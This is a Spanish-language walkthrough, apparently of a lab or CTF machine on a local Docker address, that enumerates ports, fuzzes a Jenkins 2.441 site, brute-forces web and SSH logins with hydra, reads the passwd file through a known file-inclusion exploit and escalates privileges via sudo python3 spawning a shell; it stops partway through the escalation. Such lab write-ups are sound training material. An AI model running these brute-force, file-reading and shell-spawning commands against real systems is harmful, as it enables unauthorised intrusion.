tags:
___
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.3
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251105125247.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,8080 -vvv -oN version 172.17.0.2
```

![[Pasted image 20251105125311.png]]

No encontramos nada interesante, así que vamos a echar un vistazo al servicio web que corre por el puerto 8080:

![[Anexos/Pasted image 20251108075215.png]]

Antes de continuar voy a hacer fuzzing para descubrir directorios y archivos ocultos:

```bash
gobuster dir -u http://172.17.0.2:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,xml -o dirs.txt
```

![[Pasted image 20251108075508.png]]

Si accedemos al index podemos ver un apartado llamado people donde podemos ver listados do usuarios, entre ellos admin:

![[Anexos/Pasted image 20251108075145.png]]

Después de probar varios directorios no encuentro nada así que voy a probar hacer fuerza bruta con hydra al usuario admin. El mensaje de error que nos arroja la web cuando introduzco credenciales erróneas es el siguiente: **Invalid username or password** así que elaboramos el siguiente comando:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-post-form://172.17.0.2:8080/login:username=admin&password=^PASS^:Invalid username or password"
```

Nada funciona, así que sigo buscando y encuentro la versión de jenkins: 2.441

![[Anexos/Pasted image 20251108082106.png]]

Tras una búsqueda en searchsploit, veo que podemos atacar a esta versión. El exploit consiste en un local file inclusion, y lo ejecuto con la ruta absoluta del archivo passwsd:

![[Anexos/Pasted image 20251108083138.png]]

Pruebo acceder a los usuarios bobby y pinguinito con fuerza bruta:

```bash
hydra -l bobby -P /usr/share/wordlists/rockyou.txt -I ssh://172.17.0.2
```

![[Anexos/Pasted image 20251108085024.png]]

Nos conectamos por ssh:

```bash
ssh bobby@172.17.0.2
```

![[Anexos/Pasted image 20251108085210.png]]

Ejecutando el comando sudo -l vemos que podemos ejecutar como root el comando python3, así que vamos a ejecutar un comando malicioso en modo interactivo para acceder al sistema como el usuario pinguinito:

![[Anexos/Pasted image 20251108085319.png]]

Ejecuto lo siguiente:

```bash
sudo -u pinguinito python3
import os; os.system("/bin/bash");
```

![[Anexos/Pasted image 20251108090621.png]]

Ahora vemos de nuevo que podemos ejecutar un script como root:

![[Anexos/Pasted image 20251108090659.png]]

![[Anexos/Pasted image 20251108095433.png]]